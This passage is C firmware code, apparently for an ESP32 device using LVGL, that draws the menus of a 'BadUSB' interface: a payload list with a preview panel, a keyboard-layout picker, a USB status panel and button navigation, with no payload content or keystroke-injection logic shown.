    lv_obj_set_style_bg_color(key, current_theme.border_accent, 0);
    lv_obj_set_style_bg_opa(key, PAY_KEY_TINT_OPA, 0);
    lv_obj_t *kico = lv_label_create(key);
    lv_label_set_text(kico, LV_SYMBOL_FILE);
    lv_obj_set_style_text_color(kico, current_theme.border_accent, 0);
    lv_obj_set_style_text_font(kico, &lv_font_montserrat_12, 0);
    lv_obj_center(kico);

    lv_obj_t *name = lv_label_create(row);
    lv_label_set_text(name, PAYLOAD_PREVIEW[i].base);
    lv_obj_set_style_text_color(name, current_theme.text_main, 0);
    lv_obj_set_style_text_font(name, &lv_font_montserrat_12, 0);
    lv_obj_set_flex_grow(name, 1);

    lv_obj_t *meta = lv_label_create(row);
    char metatxt[32];
    snprintf(metatxt, sizeof(metatxt), ".duck \xC2\xB7 %s", PAYLOAD_PREVIEW[i].size);
    lv_label_set_text(meta, metatxt);
    lv_obj_set_style_text_color(meta, current_theme.border_inactive, 0);
    lv_obj_set_style_text_font(meta, &lv_font_montserrat_12, 0);

    s_pay_rows[i] = row;
  }

  lv_obj_t *prev = lv_obj_create(s_screen);
  lv_obj_remove_flag(prev, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_size(prev, PAY_PREVIEW_W, PAY_PREVIEW_H);
  lv_obj_align(prev, LV_ALIGN_BOTTOM_MID, 0, -PAY_PREVIEW_BOT);
  lv_obj_set_style_radius(prev, PAY_PREVIEW_RAD, 0);
  lv_obj_set_style_bg_color(prev, lv_color_hex(DARK_PANEL_COLOR), 0);
  lv_obj_set_style_bg_opa(prev, LV_OPA_COVER, 0);
  lv_obj_set_style_border_width(prev, TERMINAL_BORDER, 0);
  lv_obj_set_style_border_color(prev, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_border_opa(prev, LV_OPA_70, 0);
  lv_obj_set_style_shadow_color(prev, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_shadow_width(prev, 12, 0);
  lv_obj_set_style_shadow_opa(prev, LV_OPA_20, 0);
  lv_obj_set_style_pad_all(prev, PAY_PREVIEW_PAD, 0);

  s_pay_prev_title = lv_label_create(prev);
  lv_obj_set_style_text_color(s_pay_prev_title, lv_color_hex(TERM_DIM_GREEN), 0);
  lv_obj_set_style_text_font(s_pay_prev_title, &lv_font_montserrat_12, 0);
  lv_obj_align(s_pay_prev_title, LV_ALIGN_TOP_LEFT, 0, 0);

  s_pay_prev_body = lv_label_create(prev);
  lv_obj_set_width(s_pay_prev_body, PAY_PREVIEW_W - PAY_PREVIEW_PAD * 2);
  lv_label_set_long_mode(s_pay_prev_body, LV_LABEL_LONG_WRAP);
  lv_obj_set_style_text_color(s_pay_prev_body, lv_color_hex(TERM_GREEN), 0);
  lv_obj_set_style_text_font(s_pay_prev_body, &lv_font_montserrat_12, 0);
  lv_obj_align(s_pay_prev_body, LV_ALIGN_TOP_LEFT, 0, 18);

  pay_apply_sel(s_payload_sel);

  fade_in(list, FADE_MS);
  fade_in(prev, FADE_MS);
}

static void build_layout(void) {
  s_menu = menu_component_create(s_screen, "LAYOUT", "/assets/icons/keyboard.bin");
  for (int i = 0; i < LAYOUT_COUNT; i++) {
    menu_component_add_item(&s_menu, "/assets/icons/keyboard.bin", LAYOUTS[i]);
    if (i == s_layout_active)
      menu_component_set_item_label_color(&s_menu, i, lv_color_hex(SIG_GREEN));
  }
  menu_component_select(&s_menu, s_layout_active);
  fade_in(s_menu.items_cont, FADE_MS);
  fade_in(s_menu.title_bar, FADE_MS);
}

static void build_status(void) {
  ui_chrome_header(s_screen, "USB STATUS", "/assets/icons/usb.bin");
  ui_chrome_footer(s_screen, STATUS_FOOTER_HINT);

  lv_obj_t *panel = lv_obj_create(s_screen);
  lv_obj_remove_flag(panel, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_size(panel, INFO_PANEL_W, INFO_PANEL_H);
  lv_obj_align(panel, LV_ALIGN_CENTER, 0, (UI_CHROME_HEADER_H - UI_CHROME_FOOTER_H) / 2);
  lv_obj_set_style_radius(panel, INFO_PANEL_RADIUS, 0);
  lv_obj_set_style_bg_opa(panel, LV_OPA_COVER, 0);
  lv_obj_set_style_bg_color(panel, current_theme.bg_primary, 0);
  lv_obj_set_style_bg_grad_color(panel, current_theme.bg_secondary, 0);
  lv_obj_set_style_bg_grad_dir(panel, LV_GRAD_DIR_VER, 0);
  lv_obj_set_style_border_width(panel, TITLE_BAR_BORDER_WIDTH, 0);
  lv_obj_set_style_border_color(panel, current_theme.border_accent, 0);
  lv_obj_set_style_pad_all(panel, 0, 0);

  for (int i = 0; i < STATUS_ROW_COUNT; i++) {
    lv_obj_t *label = lv_label_create(panel);
    lv_label_set_text(label, STATUS_ROWS[i].label);
    lv_obj_set_style_text_color(label, current_theme.border_inactive, 0);
    lv_obj_set_style_text_font(label, &lv_font_montserrat_12, 0);
    lv_obj_align(label, LV_ALIGN_TOP_LEFT, INFO_LABEL_X, INFO_FIRST_ROW_Y + i * INFO_ROW_GAP);

    lv_obj_t *value = lv_label_create(panel);
    lv_label_set_text(value, STATUS_ROWS[i].value);
    bool is_ready = (i == STATUS_ROW_COUNT - 1);
    lv_obj_set_style_text_color(
        value, is_ready ? lv_color_hex(SIG_GREEN) : current_theme.text_main, 0);
    lv_obj_set_style_text_font(value, &lv_font_montserrat_12, 0);
    lv_obj_align(value, LV_ALIGN_TOP_RIGHT, -INFO_LABEL_X, INFO_FIRST_ROW_Y + i * INFO_ROW_GAP);
  }

  fade_in(panel, FADE_MS);
}

static void build_screen(void) {
  stop_stage_timer();
  stop_type_timer();
  if (s_screen != NULL) {
    lv_obj_del(s_screen);
    s_screen = NULL;
  }
  s_status_lbl = NULL;
  s_detect_group = NULL;
  s_delivery_group = NULL;
  s_term_lbl = NULL;
  s_progress = NULL;
  s_pct_lbl = NULL;
  s_pay_prev_title = NULL;
  s_pay_prev_body = NULL;
  for (int i = 0; i < PAYLOAD_COUNT; i++)
    s_pay_rows[i] = NULL;

  s_screen = lv_obj_create(NULL);
  lv_obj_set_style_bg_color(s_screen, current_theme.screen_base, 0);
  lv_obj_set_style_bg_opa(s_screen, LV_OPA_COVER, 0);
  lv_obj_remove_flag(s_screen, LV_OBJ_FLAG_SCROLLABLE);
  lv_obj_set_style_border_width(s_screen, 0, 0);
  lv_obj_set_style_pad_all(s_screen, 0, 0);

  switch (s_view) {
    case VIEW_PAYLOADS:
      build_payloads();
      break;
    case VIEW_RUNNING:
      build_running();
      break;
    case VIEW_LAYOUT:
      build_layout();
      break;
    case VIEW_STATUS:
      build_status();
      break;
    case VIEW_LIST:
    default:
      s_menu = menu_component_create(s_screen, "BADUSB", "/assets/icons/usb.bin");
      for (int i = 0; i < MENU_ITEM_COUNT; i++)
        menu_component_add_item(&s_menu, MENU_ITEMS[i].icon, MENU_ITEMS[i].name);
      fade_in(s_menu.items_cont, FADE_MS);
      fade_in(s_menu.title_bar, FADE_MS);
      break;
  }

  if (s_nav_timer == NULL)
    s_nav_timer = lv_timer_create(nav_timer_cb, NAV_TIMER_MS, NULL);

  ui_screen_load(s_screen);
}

static void nav_timer_cb(lv_timer_t *t) {
  if (lv_screen_active() != s_screen) {
    lv_timer_delete(t);
    s_nav_timer = NULL;
    return;
  }
  if (ui_input_is_locked())
    return;

  bool up = ui_btn_up();
  bool down = ui_btn_down();
  bool left = ui_btn_left();
  bool right = ui_btn_right();
  bool ok = ok_button_is_down();
  bool back = back_button_is_down();

  switch (s_view) {
    case VIEW_LIST:
      if (down && !s_down_last)
        menu_component_next(&s_menu);
      if (up && !s_up_last)
        menu_component_prev(&s_menu);
      if (ok && !s_ok_last) {
        int sel = menu_component_get_selected(&s_menu);
        if (sel == IDX_RUN_PAYLOAD) {
          s_payload_sel = 0;
          s_view = VIEW_RUNNING;
          build_screen();
          goto latch;
        } else if (sel == IDX_PAYLOADS) {
          s_view = VIEW_PAYLOADS;
          build_screen();
          goto latch;
        } else if (sel == IDX_LAYOUT) {
          s_view = VIEW_LAYOUT;
          build_screen();
          goto latch;
        } else if (sel == IDX_STATUS) {
          s_view = VIEW_STATUS;
          build_screen();
          goto latch;
        } else if (sel == IDX_MOUSE) {
          ui_switch_screen(SCREEN_USB_MOUSE);
          goto latch;
        }
      }
      if (back && !s_back_last)
        ui_switch_screen(SCREEN_MENU);
      break;

    case VIEW_PAYLOADS:
      if (down && !s_down_last && s_payload_sel < PAYLOAD_COUNT - 1) {
        s_payload_sel++;
        pay_apply_sel(s_payload_sel);
      }
      if (up && !s_up_last && s_payload_sel > 0) {
        s_payload_sel--;
        pay_apply_sel(s_payload_sel);
      }
      if (ok && !s_ok_last) {
        s_view = VIEW_RUNNING;
        build_screen();
        goto latch;
      }
      if (back && !s_back_last) {
        s_view = VIEW_LIST;
        build_screen();
        goto latch;
      }
      break;

    case VIEW_RUNNING:
      if (s_run_stage == RUN_STAGE_DONE && right && !s_right_last) {
        build_screen();
        goto latch;
      }
      if (back && !s_back_last) {
        s_view = VIEW_LIST;
        build_screen();
        goto latch;
      }
      break;

    case VIEW_LAYOUT:
      if (down && !s_down_last)
        menu_component_next(&s_menu);
      if (up && !s_up_last)
        menu_component_prev(&s_menu);
      if (ok && !s_ok_last) {
        int sel = menu_component_get_selected(&s_menu);
        if (sel >= 0 && sel < LAYOUT_COUNT && sel != s_layout_active) {
          menu_component_set_item_label_color(&s_menu, s_layout_active, current_theme.text_main);
          s_layout_active = sel;
          menu_component_set_item_label_color(&s_menu, s_layout_active, lv_color_hex(SIG_GREEN));
          ESP_LOGI(TAG, "mock layout set: %s", LAYOUTS[s_layout_active]);
        }
      }
      if (back && !s_back_last) {
        s_view = VIEW_LIST;
        build_screen();
        goto latch;
      }
      break;

    case VIEW_STATUS:
      if (back && !s_back_last) {
        s_view = VIEW_LIST;
        build_screen();
        goto latch;
      }
      break;
  }

  s_up_last = up;
  s_down_last = down;
  s_left_last = left;
  s_right_last = right;
  s_ok_last = ok;
  s_back_last = back;
  return;

latch:
  s_up_last = up;
  s_down_last = down;
  s_left_last = left;
  s_right_last = right;
  s_ok_last = ok;
  s_back_last = back;
}

void ui_badusb_menu_open(void) {
  s_nav_timer = NULL;
  s_stage_timer = NULL;
  s_type_timer = NULL;
  s_view = VIEW_LIST;
  s_payload_sel = 0;
  build_screen();
}
